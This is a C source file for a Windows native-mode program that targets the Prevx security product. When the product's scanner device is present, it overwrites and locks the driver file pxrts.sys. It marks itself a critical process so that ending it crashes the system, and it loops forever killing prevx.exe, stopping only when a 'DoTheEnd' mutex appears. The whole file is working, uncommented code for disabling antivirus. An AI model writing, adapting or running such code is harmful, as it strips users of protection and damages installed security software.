#include "windows.h"
#include ".\rtls\ntdll.h"
#include "rtl.h"

#pragma comment(linker,"/ENTRY:NtProcessStartup")
#pragma warning(disable:4100)

char *Daniel = "Hello Daniel .|.";
WCHAR buf[MAX_PATH];

HANDLE hBeep;
HANDLE hMutant;


void DoBeep(HANDLE f);
void ScanProcesses();
NTSTATUS NTAPI WriteBufferToFile(PWSTR lpFileName, PVOID Buffer, DWORD Size, BOOL Append);

NTSTATUS NTAPI BootPrint(IN PWSTR szMessage)
{
	UNICODE_STRING us;
	RtlInitUnicodeString(&us,szMessage);
	return NtDisplayString(&us);
}

NTSTATUS NTAPI NtSleep(IN DWORD dwMiliseconds)
{
	struct
	{
		DWORD Low;
		DWORD Hi;
	} MLI = {{-10000 * dwMiliseconds},{0xFFFFFFFF}};

	return NtDelayExecution(0, (PLARGE_INTEGER)&MLI);
}

PVOID RtlGetProcessHeap()
{
	return NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
}

NTSTATUS NTAPI ThreadRoutine(PVOID Param)
{
	UNICODE_STRING String;
	OBJECT_ATTRIBUTES attr;
	NTSTATUS Status;

	RtlInitUnicodeString(&String, L"\\BaseNamedObjects\\DoTheEnd");
	InitializeObjectAttributes(&attr, &String, OBJ_CASE_INSENSITIVE, 0, 0);

	while (1)
	{
		Status = NtOpenMutant(&hMutant, MUTANT_ALL_ACCESS, &attr);
		if (NT_SUCCESS(Status))
		{
			NtClose(hMutant);
			RtlSetProcessIsCritical(FALSE, NULL, FALSE);
			NtTerminateProcess(NtCurrentProcess(), 0xC00FFEE);
		}
		NtSleep(1000);
	}

	return STATUS_SUCCESS;
}

NTSTATUS NTAPI NativeCreateThread(
	IN PVOID ThreadRoutine,   
	OUT HANDLE *ThreadHandle,
	OUT HANDLE *UniqueThread,
	IN HANDLE ProcessHandle
	)
{
	NTSTATUS Status;
	ULONG AllocationSize = PAGE_SIZE * 256;
	PVOID BaseAddress = NULL;
	ULONG StackReserve = 0;
	PVOID ExpandableStackBase = NULL;
	ULONG OldProtect;
	ULONG ThreadRoutineLength = PAGE_SIZE;

	USER_STACK UserStack;
	CONTEXT Context;
	CLIENT_ID ClientId;

	BaseAddress = NULL;

	Status = NtAllocateVirtualMemory(
		ProcessHandle,
		&BaseAddress,
		0,
		&AllocationSize,
		MEM_RESERVE,
		PAGE_READWRITE);

	if(!NT_SUCCESS(Status))
	{
		return Status;
	}

	UserStack.FixedStackBase = NULL;
	UserStack.FixedStackLimit = NULL;
	UserStack.ExpandableStackBase = (PVOID)((ULONG)BaseAddress + AllocationSize);
	UserStack.ExpandableStackLimit = (PVOID)((ULONG)BaseAddress + AllocationSize - PAGE_SIZE);
	UserStack.ExpandableStackBottom = BaseAddress;

	ExpandableStackBase = (PVOID)((ULONG)UserStack.ExpandableStackBase - PAGE_SIZE * 2);

	StackReserve = PAGE_SIZE * 2;

	Status = NtAllocateVirtualMemory(
		ProcessHandle,
		&ExpandableStackBase,
		0,
		&StackReserve,
		MEM_COMMIT,
		PAGE_READWRITE);
	if(!NT_SUCCESS(Status))
	{
		return Status;
	}

	//create GUARD page
	StackReserve = PAGE_SIZE;
	Status = NtProtectVirtualMemory(
		ProcessHandle,               // ProcessHandle
		&ExpandableStackBase,        // BaseAddress
		&StackReserve,               // ProtectSize
		PAGE_READWRITE | PAGE_GUARD, // NewProtect
		&OldProtect);                // OldProtect

	if(!NT_SUCCESS(Status))
	{
		return Status;
	}    

	Context.SegGs = 0x00;
	Context.SegFs = 0x38;
	Context.SegEs = 0x20;
	Context.SegDs = 0x20;
	Context.SegSs = 0x20;
	Context.SegCs = 0x18;
	Context.EFlags = 0x3000;
	Context.ContextFlags = 0x10007;
	Context.Esp = (ULONG)UserStack.ExpandableStackBase;
	Context.Eip = (ULONG)ThreadRoutine;


	Status = NtCreateThread(
		ThreadHandle,      // ThreadHandle
		THREAD_ALL_ACCESS, // DesiredAccess
		NULL,              // ObjectAttributes
		ProcessHandle,     // ProcessHandle
		&ClientId,         // ClientId
		&Context,          // ThreadContext
		(PINITIAL_TEB)&UserStack,        // UserStack
		FALSE);             // CreateSuspended

	if(!NT_SUCCESS(Status))
	{
		return Status;
	}
	*UniqueThread = ClientId.UniqueThread;

	return Status;
}

BOOL NTAPI DeviceIsRunning(IN PWSTR DeviceName)
{
	UNICODE_STRING str;
	OBJECT_ATTRIBUTES attr;
	HANDLE hLink;
	NTSTATUS Status;

	BOOL result = FALSE;

	RtlInitUnicodeString(&str, DeviceName);
	InitializeObjectAttributes(&attr, &str, OBJ_CASE_INSENSITIVE, 0, 0);
	Status = NtOpenSymbolicLinkObject(&hLink, SYMBOLIC_LINK_QUERY, &attr);
	if (NT_SUCCESS(Status))
	{
		result = TRUE;
		NtClose(hLink);
	}
	return result;
}

PVOID NTAPI mmalloc(DWORD uSize)
{
	PVOID result = NULL;

	NtAllocateVirtualMemory(NtCurrentProcess(), &result, 0, &uSize, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);
	return result;
}

VOID NTAPI mmfree(PVOID Buffer)
{
	DWORD memio = 0;
	NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &memio, MEM_RELEASE);
}

PVOID NTAPI 
	AllocateInfoBuffer(
	IN SYSTEM_INFORMATION_CLASS InfoClass, 
	PULONG ReturnLength
	)
{
	PVOID		pBuffer = NULL;
	ULONG		uSize   = PAGE_SIZE;
	NTSTATUS	Status;

	do
	{
		pBuffer = mmalloc(uSize);

		if (pBuffer != NULL) 
		{
			Status = NtQuerySystemInformation(InfoClass, pBuffer, uSize, NULL);

		} else return NULL;	

		if (Status == STATUS_INFO_LENGTH_MISMATCH)
		{
			mmfree(pBuffer);
			uSize *= 2;
		}

	} while (Status == STATUS_INFO_LENGTH_MISMATCH);

	if (NT_SUCCESS(Status))
	{
		if (ReturnLength) *ReturnLength = uSize;
		return pBuffer;
	}

	if (pBuffer) mmfree(pBuffer);
	return NULL;
}

typedef struct _BEEP_PARAMS {
	ULONG uFrequency;
	ULONG uDuration;
} BEEP_PARAMS;

HANDLE PrepareBeep()
{
	UNICODE_STRING str;
	OBJECT_ATTRIBUTES attr;
	IO_STATUS_BLOCK iost;
	HANDLE f;

	RtlInitUnicodeString(&str, L"\\Device\\Beep");
	attr.Length = sizeof(OBJECT_ATTRIBUTES);
	attr.RootDirectory = 0;
	attr.ObjectName = &str;
	attr.Attributes = 0;
	attr.SecurityDescriptor = 0;
	attr.SecurityQualityOfService = 0;

	NtCreateFile(&f, GENERIC_READ | GENERIC_WRITE, &attr, &iost, 0, 0,
		0, FILE_OPEN, 0, 0, 0);

	return f;
}

void DoBeep(HANDLE f)
{   
	BEEP_PARAMS param;
	IO_STATUS_BLOCK iost;

	param.uFrequency = 2500;
	param.uDuration = 10;

	NtDeviceIoControlFile(f, 0, 0, 0, &iost, 0x00010000,
		&param, sizeof(BEEP_PARAMS), 0, 0);
}

NTSTATUS NativeDeleteFile(PWSTR FileName)
{
	HANDLE hFile;
	NTSTATUS Status;
	OBJECT_ATTRIBUTES attr;
	IO_STATUS_BLOCK iost;
	FILE_DISPOSITION_INFORMATION fDispositionInfo;
	FILE_BASIC_INFORMATION fBasicInfo;
	UNICODE_STRING TargetFileName;

	Status = STATUS_UNSUCCESSFUL;

	RtlInitUnicodeString(&TargetFileName, FileName);
	InitializeObjectAttributes(&attr, &TargetFileName, OBJ_CASE_INSENSITIVE, 0, 0);

	Status = NtOpenFile(&hFile, DELETE | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES,
		&attr, &iost, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		FILE_NON_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT);
	if (NT_SUCCESS(Status))
	{
		Status = NtQueryInformationFile(hFile, &iost, &fBasicInfo, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation);
		if (NT_SUCCESS(Status))
		{
			fBasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
			NtSetInformationFile(hFile, &iost, &fBasicInfo, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation);
		}
		fDispositionInfo.DeleteFile = TRUE;
		Status = NtSetInformationFile(hFile, &iost, &fDispositionInfo, sizeof(FILE_DISPOSITION_INFORMATION), FileDispositionInformation);
		NtClose(hFile);
	}
	return Status;
}

NTSTATUS 
	NTAPI 
	WriteBufferToFile(
	PWSTR lpFileName, 
	PVOID Buffer, 
	DWORD Size, 
	BOOL Append
	)
{
	HANDLE fh;
	NTSTATUS ns;
	DWORD dwFlag;
	OBJECT_ATTRIBUTES attr;
	UNICODE_STRING str1;
	FILE_STANDARD_INFORMATION fs1;
	IO_STATUS_BLOCK iost;


	iost.Information = 0;

	if (RtlDosPathNameToNtPathName_U(lpFileName, &str1, NULL, NULL)) {

		ns = FILE_WRITE_ACCESS | SYNCHRONIZE;    
		dwFlag = FILE_OVERWRITE_IF;

		if (Append) {
			ns |= FILE_READ_ACCESS; 
			dwFlag = FILE_OPEN_IF;
		}

		InitializeObjectAttributes(&attr, &str1, OBJ_CASE_INSENSITIVE, 0, NULL);

		ns = NtCreateFile(&fh, ns, &attr,
			&iost, NULL, FILE_ATTRIBUTE_NORMAL, 0, dwFlag,
			FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);

		if (NT_SUCCESS(ns))  
		{
			if (Append) 
			{
				ns = NtQueryInformationFile(fh, &iost, &fs1, 
					sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
				if (NT_SUCCESS(ns))	{
					ns = NtWriteFile(fh, 0, NULL, NULL, &iost, Buffer, Size, &fs1.EndOfFile, NULL);
				}
			}
			else {
				ns = NtWriteFile(fh, 0, NULL, NULL, &iost, Buffer, Size, NULL, NULL);
			}
			NtFlushBuffersFile(fh, &iost);
			NtClose(fh);
		}
		RtlFreeUnicodeString(&str1);
	}
	return ns;
}

void ScanProcesses()
{
	ULONG r;
	PSYSTEM_PROCESSES_INFORMATION Info, p;
	HANDLE hProcess;
	NTSTATUS Status;
	OBJECT_ATTRIBUTES attr;
	CLIENT_ID cid;


	p = (PSYSTEM_PROCESSES_INFORMATION)AllocateInfoBuffer(SystemProcessInformation, &r);
	if (p == NULL) return;
	Info = p;
	for (;;)
	{
		if (Info->ProcessName.Buffer)
		{
			if (strcmpiW(Info->ProcessName.Buffer, L"prevx.exe") == 0)
			{
				cid.UniqueProcess = (HANDLE)Info->ProcessId;
				cid.UniqueThread = 0;
				InitializeObjectAttributes(&attr, 0, 0, 0, 0);

				Status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &attr, &cid);
				if (NT_SUCCESS(Status))
				{
					NtTerminateProcess(hProcess, 0);
					NtClose(hProcess);
				}
				DoBeep(hBeep);
			}
		}
		if (Info->NextEntryDelta == 0) break;
		Info = (PSYSTEM_PROCESSES_INFORMATION)(((PUCHAR)Info)+ Info->NextEntryDelta);
	}
	mmfree(p);
}

void BlockDriverAtDisk()
{
	HANDLE hFile;
	OBJECT_ATTRIBUTES attr;
	IO_STATUS_BLOCK iost;
	UNICODE_STRING TargetFileName;
	LARGE_INTEGER cb, bo;
	NTSTATUS Status;

	RtlInitUnicodeString(&TargetFileName, L"\\SystemRoot\\system32\\drivers\\pxrts.sys");
	InitializeObjectAttributes(&attr, &TargetFileName, OBJ_CASE_INSENSITIVE, 0, 0);

	Status = NtCreateFile(&hFile, FILE_READ_ACCESS | FILE_WRITE_ACCESS | SYNCHRONIZE, &attr,
		&iost, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
		FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);	

	if (NT_SUCCESS(Status))
	{
		Status = NtWriteFile(hFile, 0, 0, 0, &iost, buf, sizeof(buf), 0, 0);

		if (NT_SUCCESS(Status))
		{
			bo.HighPart = 0;
			bo.LowPart = 0;

			cb.HighPart = 0;
			cb.LowPart = sizeof(buf);

			NtLockFile(hFile, 0, 0, 0, &iost, &bo, &cb, 0, TRUE, TRUE);
		}
	}
}

void NtProcessStartup( PSTARTUP_ARGUMENT Argument )
{
	HANDLE ThreadHandle, UniqueThread;
	NTSTATUS Status;

	if (DeviceIsRunning(L"\\??\\pxscan")) 
	{

		BlockDriverAtDisk();
		hBeep = PrepareBeep();

		Status = NativeCreateThread(&ThreadRoutine, &ThreadHandle, &UniqueThread, NtCurrentProcess());
		if (NT_SUCCESS(Status))
		{
			NtClose(ThreadHandle);
		}
		RtlSetProcessIsCritical(TRUE, NULL, FALSE);

		while ( 1 )
		{
			NtSleep(1000);
			ScanProcesses();
		}
		if (hBeep) NtClose(hBeep);
	}

	NtTerminateProcess(NtCurrentProcess(), 0);
	__asm
	{
		jmp Daniel
	}
}